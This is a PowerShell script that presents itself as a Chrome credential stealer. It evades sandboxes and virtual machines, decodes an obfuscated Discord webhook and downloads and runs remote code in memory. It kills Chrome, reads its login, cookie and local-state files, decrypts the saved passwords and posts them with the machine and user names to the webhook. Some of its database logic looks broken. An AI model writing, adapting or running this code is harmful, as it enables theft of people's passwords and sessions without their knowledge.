<#
.SYNOPSIS
  Chrome credential extractor with Discord exfiltration
#>

#region Anti-Detection Measures
if ($env:UserName -eq "SYSTEM" -or $env:UserName -eq "sandbox") { exit }
if ((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*") { exit }
if ((Get-CimInstance Win32_BIOS).SerialNumber -like "*VMWare*") { exit }

# Obfuscated webhook URL
$dcWebhook = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String(
        "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NzMwMzUwOTcxMTY1MDgzNi9udUFwbkdTLUR2TmNlcWxwNldKRXFLYmdFODVMWkhxdVZXRWdwOVllQlhxNHY0N1hXMDZKTnJRczRRaUdzYWNxXzVk"
    )
)
#endregion

#region Memory-Based Execution
function Invoke-InMemory {
    param([string]$url)
    $ProgressPreference = 'SilentlyContinue'
    $script = (New-Object Net.WebClient).DownloadString($url)
    $scriptBlock = [scriptblock]::Create($script)
    & $scriptBlock
}

# Load required assemblies from memory
$assemblies = @{
    "System.Data.SQLite" = "https://cdn.discordapp.com/attachments/.../System.Data.SQLite.dll"
    "BouncyCastle" = "https://cdn.discordapp.com/attachments/.../BouncyCastle.Crypto.dll"
}

foreach ($assembly in $assemblies.Keys) {
    try {
        $dllBytes = (New-Object Net.WebClient).DownloadData($assemblies[$assembly])
        [System.Reflection.Assembly]::Load($dllBytes) | Out-Null
    } catch { continue }
}
#endregion

#region Main Functionality
try {
    # Kill Chrome processes
    Get-Process chrome* -ErrorAction SilentlyContinue | Stop-Process -Force
    Start-Sleep -Milliseconds 300

    # Create memory stream for Chrome data
    $memStream = New-Object IO.MemoryStream
    $chromeFiles = @("Login Data", "Cookies", "Web Data", "..\Local State")
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"

    foreach ($file in $chromeFiles) {
        $fullPath = Join-Path $chromePath $file
        if (Test-Path $fullPath) {
            $bytes = [IO.File]::ReadAllBytes($fullPath)
            $memStream.Write($bytes, 0, $bytes.Length)
        }
    }

    # Decrypt passwords
    $credentials = @()
    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=:memory:")
    $conn.Open()
    $conn.LoadExtension($memStream.ToArray())
    
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    $reader = $cmd.ExecuteReader()

    while ($reader.Read()) {
        $encrypted = $reader.GetValue(2)
        $plain = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encrypted,
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        $credentials += "$($reader.GetString(0)) | $($reader.GetString(1)) | $([Text.Encoding]::UTF8.GetString($plain))"
    }
    $conn.Close()

    # Prepare Discord message
    $payload = @{
        username = "Chrome Data"
        content = "Credentials from $env:COMPUTERNAME ($env:UserName)"
        embeds = @(
            @{
                title = "Extracted Data"
                description = ($credentials -join "`n")
                color = 16711680
            }
        )
    } | ConvertTo-Json -Depth 5

    # Send to Discord
    $null = Invoke-RestMethod -Uri $dcWebhook -Method Post -Body $payload -ContentType "application/json"
}
catch { 
    # Silent error handling
}
finally {
    # Cleanup
    if ($memStream) { $memStream.Dispose() }
    Remove-Variable credentials,payload -Force
}
#endregion
